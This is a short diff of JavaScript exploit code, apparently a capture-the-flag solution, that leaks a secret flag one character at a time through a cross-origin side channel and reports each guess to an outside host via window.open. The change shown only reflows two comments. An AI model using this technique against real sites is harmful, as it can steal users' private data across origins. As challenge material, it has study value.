@@ -138,7 +138,8 @@ async function search(candidates,url,host) {
 		await sleep(200);
 		try {
 			win.origin;
-			// if win.origin does not trigger an error no page was opened, must be a download
+			// if win.origin does not trigger an error 
+			// no page was opened, must be a download
 			window.open(host + '/' + i + '/y/' + flag + candidates[i]);
 			flag = flag + candidates[i];
 			if (candidates[i] == '}') {
@@ -146,7 +147,8 @@ async function search(candidates,url,host) {
 			}
 			break;
 		} catch(e) {
-			// if navigation occured an error is triggered because window is cross-origin
+			// if navigation occured an error is triggered
+			// window is cross-origin
 			window.open(host + '/' + i + '/n/' + flag + candidates[i]); 
 		}
 		//await sleep(200);  	
